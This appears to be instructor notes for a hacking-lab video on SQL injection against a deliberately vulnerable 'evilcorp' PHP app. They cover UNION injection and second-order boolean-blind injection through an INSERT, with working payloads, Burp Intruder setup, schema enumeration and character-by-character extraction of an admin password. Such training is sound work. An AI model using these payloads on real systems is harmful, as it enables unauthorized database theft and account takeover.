What is UNION anyways? 

inside SQL console: 
select 1,2,3,4;

This is a valid statement. 
select 1,2,3,4 union select 5,6,7,8;

This is not a valid SQL statement, the union portion needs to be selecting the same amount of columns.
select 1,2,3,4 union select 5,6,7;

This is a valid statement. Note that the character does not match as long as we have the same amount on both sides. 
select 1,2,3,4 union select 3,5,7,9;



Let's look at the origional query on list.php: 

SELECT * FROM users WHERE country='mexico';

The select * value is going to be the amount of columns 

select * from users;

In this case, we can see three columns.

SELECT * FROM users WHERE country='mexico' UNION SELECT 1,2,3-- -'
remember:      mexico' UNION SELECT 1,2,3-- -    is our user input 


The injected part UNION SELECT 1,2,3 is a valid SQL statement that creates a new row with three columns containing the values 1, 2, and 3.

SELECT * FROM users WHERE country='mexico' UNION SELECT 1,database(),3-- -'

The UNION command makes it do an additional select, on a new line.

In some cases, the additional hyphen at the end, as in "-- -", may be necessary to ensure that any trailing characters or syntax from the original query are properly commented out. 
This helps to avoid potential syntax errors that could arise if the original query includes certain characters or keywords immediately after the injection point. 
The trailing hyphen ensures that the injected code is executed correctly by ensuring that any remnants of the original query are treated as comments.



Okay, let's look at the home.php file 

INSERT INTO users (username, country) VALUES ('$name', '$country')

Which of these commands will work in terminal, and why? 
INSERT INTO users (username, country) VALUES ('bob3', 'mexico3'); union select 1,2,3; -- -', 'country_value')
INSERT INTO users (username, country) VALUES ('bob3', 'mexico3'); select 1,2,3; -- -', 'country_value')

*demo* 

The second command works. In order to use a UNION statement, there must be another SELECT statement earlier in the query. 

So, this user input is our injection:
mexico3'); select 1,2,3; -- -

However, this will fail inside burp when we send this post body data.

The injection you attempted in the INSERT statement seems to be causing an error when posted to the home.php script. 
This error occurs because the code is not expecting multiple queries to be executed in a single statement.

To successfully execute multiple queries in a single statement, the underlying database driver or API must support it and be properly configured. 
By default, the PHP MySQLi extension does not allow multiple queries in a single statement for security reasons.

So, no stacking queries in our injection. Let's think about another way we can attack this. 

DIVE DEEP, WE SWIMMING NOW, DON'T DROWN !!! 



Origional query: 
INSERT INTO users (username, country) VALUES ('joe', 'mexico')

We can set our payload to "mexico')-- -" although this doesn't change the outcome, it confirms that it is possibly injectable. 
INSERT INTO users (username, country) VALUES ('joe', 'mexico')-- -     ')

We can't STACK queries but we can use certain operators to cause unintentional code execution. The OR statement is perfect for this, as it's not stacking queries. 

INSERT INTO users (username, country) VALUES ('true_check_1', '' OR '2'='2     ')
burp: 
name=true_check_1&country=' OR '2'='2

show in the mysql gui: select * from users;
| 70 | true_check_1        | 1                |

2=2 is true, so it writes a 1 
'' OR '2'='2'
It chooses the OR value, which is true, so it wrote 1 to the database because 1 = true and 0 = false 

Doing it this way would also work: 
INSERT INTO users (username, country) VALUES ('true_check_2', '' OR '2'='2')-- -     ')

Now, let's write 
'' OR '2'='1'

which should cause it to be false, and write a 0 
burp: 
name=true_check_3&country=' OR '2'='1

gui: select * from users;
| 73 | true_check_3        | 0                |

We can see it wrote a 0 for false because 2=1 is a false statement. This is critical to remember for later. 

One more thing I always like to do is to try and have a sleep function work to confirm 100% that it's injectable: 
INSERT INTO users (username, country) VALUES ('joe', '' OR SLEEP(15))-- -     ')

Okay. This is where BOOLEAN injection can come into play! 

This payload exploits a boolean-based blind SQL injection vulnerability by performing ASCII comparison. 
It tries to extract information about the database name by checking if the ASCII value of the first character is greater than 97 (the ASCII value for 'a').
https://www.ascii-code.com/

INSERT INTO users (username, country) VALUES ('db97', '' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 97) -- -    ')

burp:
name=db97&country=' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 97) -- -
*successful* 

mysql gui: 
select * from users;

We can see that db97 is set to 1, so our statement must be true! The database ascii value is greater than A 

Now let's try 122, which is Z. If this is also set FALSE, then we know it's GREATER than 97, but LESS THAN 122

INSERT INTO users (username, country) VALUES ('db97', '' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 122) -- -    ')

burp:
name=db122&country=' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 122) -- -
*successful* 

mysql gui: 
select * from users;

| 74 | db97                | 1                |
| 75 | db122               | 0                |

So we know that the first letter of the database is between 97 and 122. 

Let's stop and think for a moment. If we did not have access to the MYSQL gui, how could we have known at 122 was false and 97 was true?
burp gives them same output for both!!!

This is referred to as a two step SQL injection because the output does not directly return the 0 or 1 to us.
home.php simply lets us know if it was able to write to the database, or not. It's not telling us if our results wrote a 1 or a 0 ! 

Let's look at the code for list.php:

  If a user submitted mexico for country on index.php, and then submits that request, home.php recieves that as a POST request from index.php 
  index.php code: <form action="home.php" method="post">
  
  
  home.php takes this value, 
  $country = $_POST['country'];
  
  and then redirects the user to list.php based on which country they entered (Location: headers are used for redirects!)
header('Location: list.php?location=' . $country);



list.php then knows our country based on the parameter 
  $country = $_GET['location'];

Then lists all the other players in our country! 
  $sql = "SELECT * FROM users WHERE country='$country'";

  (this is vulnable my itself, but we will talk about that later)

We can see on the mysql GUI that the 1s and 0s were being written to the country field.
Using list.php, we specify which countries to see by using the ?location= parameter 

If we set our parameter to 1, we can see if our earlier requests were true. 
?location=1
db97

we can see if our earlier requests were false:
  ?location=0
  db122

(open the two pages in two tabs to make it easier)

Okay, let's go back to what we were doing.
We know that the first letter of the database is "greater than" a, or ascii 97 and lower than z, or ascii 122 
Notice how I am strategically using the username here. 


burp:
name=db115&country=' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 115) -- -

113 is true. So it's between 113, and 122 

When we have it down to a range, we can begin to check individual numbers. 

name=db115&country=' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 115) -- -

name=db116equal&country=' OR ASCII(SUBSTRING((SELECT database()),1,1)) = 116) -- -

name=db117equal&country=' OR ASCII(SUBSTRING((SELECT database()),1,1)) = 117) -- -

We can see that the first letter of the database is 'u'

Now we can find the second letter, which is 's'
name=db115equal&country=' OR ASCII(SUBSTRING((SELECT database()),2,1)) = 115) -- -

The range method is important to know about, but you should also switch to using burp as it will be much easier to run through this with intruder.
Let's use burp to find the third character. 

send to intruder
attack type: battering ram. Explain attack types to viewer.
We are setting our positions around the two numbers here.
If the number loads on =1 web page, then we know the right number for this letter. 
name=db§110§equal&country='+OR+ASCII(SUBSTRING((SELECT+database()),3,1))+%3d+§110§)+--+-

We find the third letter, 'e'

I suspect that the database might be named users. We can do a quick check to confirm, instead of going through the rest of this process. 

Let's remember the origional query we are attacking 
INSERT INTO users (username, country) VALUES ('$name', '$country')


So, our user input goes in here:
INSERT INTO users (username, country) VALUES ('$name', '       ')


Ideally, this would be as easy as:
(demo copy and pasting inside)
INSERT INTO users (username, country) VALUES ('$name', '       ')
' OR DATABASE() = 'users' -- -

INSERT INTO users (username, country) VALUES ('$name', '' OR DATABASE() = "users") -- -       ')

Right, because if the DATABASE value is 'users' then users = users which should show true, 1, just like 2=2 would load the 1 for true. 

We can see that users is equal to 1, 
name=dbusersguess&country=' OR DATABASE() = "users") -- -

So we can confirm that the database name is users.


name=dbusersguess&country=' OR (SELECT table_name FROM information_schema.tables WHERE table_schema='users' LIMIT 1) = 'users') -- -

Now, we need to hunt for our table. We will go over the manual method of finding, but first let's practice the guessing method. Our target is hosting an evilcorp homepage,
maybe there is a table called evilcorp? 

name=evilcorpguess1&country=' OR (SELECT table_name FROM information_schema.tables WHERE table_schema='users' LIMIT 1) = 'evilcorp') -- -

Fantastic. Next, can we guess that there is a password column inside this table? 

' OR (SELECT column_name FROM information_schema.columns WHERE table_schema='users' AND table_name='evilcorp' AND column_name='password' LIMIT 1) = 'password') -- -

name=columnguess1_password&country=' OR (SELECT column_name FROM information_schema.columns WHERE table_schema='users' AND table_name='evilcorp' AND column_name='password' LIMIT 1) = 'password') -- -

Yes. So for our guesses, we have quickly figured out:
  database:users
  tablename:evilcorp
  column:password

  If you are limited to using boolean-based blind SQL injection without the ability to stack queries, viewing the contents of the column can be challenging. 
  Boolean-based blind SQL injection is typically used for extracting boolean (true/false) responses from the application, rather than retrieving the actual data.

  However, if you have successfully confirmed the existence of the "password" column within the "evilcorp" table, you can attempt to extract the data character by character using techniques such as substring extraction.

Here's an example payload that extracts the contents of the "password" column character by character:

name=dbusersguess&country=' OR ASCII(SUBSTRING((SELECT password FROM evilcorp LIMIT 1), X, 1)) = Y) --

In this payload, you need to replace X with the position of the character you want to retrieve (starting from 1), 
and Y with the ASCII value of the character you want to compare against. By iterating through different values of X and Y, 
you can gradually retrieve the characters of the "password" column.

For example, to retrieve the first character of the "password" column, you would use X=1 and Y as the ASCII value of the character you want to guess. 
You can then repeat the process for subsequent characters by incrementing X accordingly.

Extracting data character by character using boolean-based blind SQL injection can be time-consuming and requires multiple requests to retrieve the complete data. 
It is not an efficient approach, especially for retrieving large amounts of data.

Set position, use burp to solve 
mode: battering ram, set on two positions for numbers 100 below
name=dumpone100&country=' OR ASCII(SUBSTRING((SELECT password FROM evilcorp LIMIT 1), 1, 1)) = 100) -- -

Note the strategic name 

refresh: 
list.php?location=1
We see only dump_115 was written, so the first character must be an 's'

Let's find the second character 

name=dumptwo100&country=' OR ASCII(SUBSTRING((SELECT password FROM evilcorp LIMIT 1), 2, 1)) = 100) -- -

?location=1

shows dumptwo117, so 2nd char is 117, or an S

Continue to dump the contents of the database. Unpause this vieo if you become stuck.

Right, you should have had a little bit of trouble as it's quite long. Also the numbers might have thrown you for a loop. 
supersecurepass123

Now that we have this password, we can guess that the username is admin and login to evilcorp lair ! 

But what if we could not have guessed the table/column names earlier? Jarvis example !